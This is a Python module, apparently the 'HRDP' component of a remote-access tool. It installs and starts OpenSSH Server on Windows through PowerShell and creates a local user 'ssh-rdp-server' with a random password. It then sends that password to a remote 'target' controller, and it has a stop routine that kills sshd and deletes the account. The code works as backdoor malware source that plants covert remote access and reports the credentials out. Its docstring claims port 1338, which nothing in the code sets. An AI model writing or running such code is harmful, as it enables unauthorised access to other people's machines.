from subprocess import Popen, PIPE
from random import choice
from string import ascii_letters, digits
import config


def shell_command(cmd):
    """ Execute a shell command """
    cmd = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
    output_bytes = cmd.stdout.read() + cmd.stderr.read()
    config.log(output_bytes.decode('utf-8', errors='replace'))


def get_random_password():
    """ Returns a randomly generated password """
    password_characters = ascii_letters + digits + '!@#$%^&()'
    password = ''.join(choice(password_characters) for i in range(8))
    return password


def install_ssh_server():
    """ Installs and sets up SSH server on port 1338"""
    uninstall_ssh_server()  # In case it's already existing
    # Start and configure SSH server
    config.log('Installing SSH Server...')
    shell_command(['PowerShell', '-Command', 'Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0'])  # Download SSH server

    config.log('Starting SSH Server...')
    shell_command('net start sshd')  # Start SSH Server


def uninstall_ssh_server():
    """ Uninstalls SSH server """
    stop()  # Stops the SSH Server
    config.log('Uninstalling SSH Server...')
    shell_command(['PowerShell', '-Command', 'Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0'])  # Removes the SSH server from the computer


def start():
    """ Starts HRDP. """
    config.log('Starting HRDP. Notice, if HRDP doesnt do anything, make sure it has admin perms.')
    stop()  # Stopping SSH server to avoid conflicts in case it's already running.

    config.log('Starting SSH Server...')
    shell_command('net start sshd')  # Starts the SSH Server

    # Create new user for the SSH server
    password = get_random_password()
    shell_command('net user ssh-rdp-server {} /ADD'.format(password))

    response = config.send_to_client(config.targets[0], ('hrdp ' + password))
    config.log(response)


def stop():
    """ Stops the ssh server. """
    # Notice, if HRDP doesnt do anything, make sure it has admin perms
    config.log('Stopping SSH Server...')
    shell_command('net stop sshd')  # Stops the SSH Server

    config.log('Ending open SSH connections...')
    shell_command('taskkill /F /IM sshd.exe /T')

    config.log('Deleting ssh-rdp-server Windows user.')
    shell_command('net user ssh-rdp-server /DELETE')  # Deletes the SSH user
